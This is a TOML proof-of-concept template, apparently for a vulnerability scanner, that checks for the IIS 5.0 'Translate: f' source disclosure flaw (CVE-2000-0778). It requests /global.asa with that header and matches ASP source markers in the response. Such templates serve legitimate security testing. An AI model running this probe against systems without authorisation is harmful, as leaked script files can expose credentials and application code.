[info]
author = "ave"
description = "通过发送带有 Translate: f 头的 HTTP 请求验证 IIS 5.0 源代码泄露漏洞，若服务端返回脚本源码而非执行结果则说明存在漏洞"
id = "POC-AVE-2000-0588"
name = "Microsoft IIS 5.0 Translate: f Source Disclosure PoC"
severity = "medium"
tags = ["ave-2000-0588"]
vuln_id = [
    "CVE-2000-0778",
    "AVE-2000-0588",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/global.asa"
protocol = "http"

[poc.requests.headers]
Translate = "f"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Application",
    "CODEPAGE",
    "<%",
]
